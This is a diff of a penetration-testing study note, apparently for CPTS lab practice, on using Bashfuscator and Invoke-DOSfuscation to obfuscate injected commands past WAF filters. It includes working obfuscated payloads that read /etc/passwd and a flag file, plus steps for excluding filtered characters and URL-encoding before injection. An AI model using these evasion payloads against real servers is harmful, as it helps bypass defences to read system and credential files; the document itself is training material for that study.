@@ -6,11 +6,11 @@
 
 ## When to Reach for Automated Obfuscation
 
-Manual techniques (Sections 5-9) are enough for most CPTS labs. Automated tools come into play when:
-- WAFs use ML-based pattern matching that catches single-trick obfuscation
-- The character set you have left is very restrictive
-- You need many variations to find which one bypasses
-- You want a one-shot, complex payload without designing it by hand
+Manual techniques (Sections 5-9) are enough for most CPTS labs. Automated tools become useful when:
+- Web Application Firewalls (WAFs) use machine-learning pattern matching that catches single-trick obfuscation
+- The allowed character set is very small
+- You need many variations to find which one bypasses the filter
+- You want a complex payload without building it by hand
 
 ---
 
@@ -25,6 +25,7 @@ cd Bashfuscator
 pip3 install setuptools==65
 python3 setup.py install --user
 ```
+> Clones the repo, pins `setuptools` to version 65 (required for compatibility), and installs the tool for the current user. Run once to set up.
 
 ### Basic usage
 ```bash
@@ -40,6 +41,7 @@ cd ./bashfuscator/bin/
 # List available obfuscators
 ./bashfuscator -l
 ```
+> `-c` specifies the command to obfuscate. `-s 1 -t 1 --no-mangling --layers 1` keeps the output compact and fast. `-l` lists all available obfuscation mutators. Swap `'cat /etc/passwd'` with any command.
 
 ### Flag reference
 
@@ -67,16 +69,18 @@ Verify it works:
 bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
 # → /etc/passwd contents
 ```
+> Run this locally in bash to confirm the obfuscated payload executes correctly before injecting it into the target. If it works locally, the same output will work on the server.
 
 ### Using output in command injection
 
-The obfuscated payload often contains characters that may still be filtered (`$`, `{`, spaces). Use `--exclude-chars` to constrain:
+The obfuscated payload often still contains characters that may be filtered (`$`, `{`, spaces). Use `--exclude-chars` to constrain the output:
 
 ```bash
 ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1 --exclude-chars " ;|&/"
 ```
+> `--exclude-chars` tells Bashfuscator to avoid those characters in its output. List all chars the target filter blocks. URL-encode the result before injecting it.
 
-URL-encode the result before injecting; replace any remaining filtered chars using Section 6/7 tricks.
+URL-encode the result before injecting. Replace any remaining filtered chars using Section 6/7 tricks.
 
 ---
 
@@ -92,12 +96,15 @@ Interactive PowerShell tool — also runs on Linux via `pwsh`.
 sudo apt install powershell    # or via pwsh package
 pwsh
 ```
+> Installs the PowerShell runtime on Kali. Run `pwsh` to start a PowerShell session, then proceed with the clone steps below.
+
 ```powershell
 git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
 cd Invoke-DOSfuscation
 Import-Module .\Invoke-DOSfuscation.psd1
 Invoke-DOSfuscation
 ```
+> Clones the tool, imports its module, and launches the interactive menu. Run all four lines inside the `pwsh` session.
 
 ### Interactive workflow
 ```
@@ -111,19 +118,21 @@ Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
 Invoke-DOSfuscation> encoding
 Invoke-DOSfuscation\Encoding> 1     # pick obfuscation level
 ```
+> `SET COMMAND` stores the command to obfuscate. `encoding` enters the environment-variable substring mode. Enter a number to pick the obfuscation level (1 = lightest).
 
 ### Sample output
 ```
 typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
 ```
 
-This uses CMD's `%VAR:~start,length%` substring extraction to assemble the command from environment variable chars.
+This uses CMD's `%VAR:~start,length%` substring extraction to assemble the command from environment variable characters.
 
 Verify in CMD:
 ```cmd
 C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
 test_flag
 ```
+> Each `%VAR:~start,length%` extracts one or more characters from an environment variable. CMD assembles them into the original command before executing. Run this in a local CMD window to verify it works before injecting.
 
 ### Three obfuscation modes
 | Mode | Use |
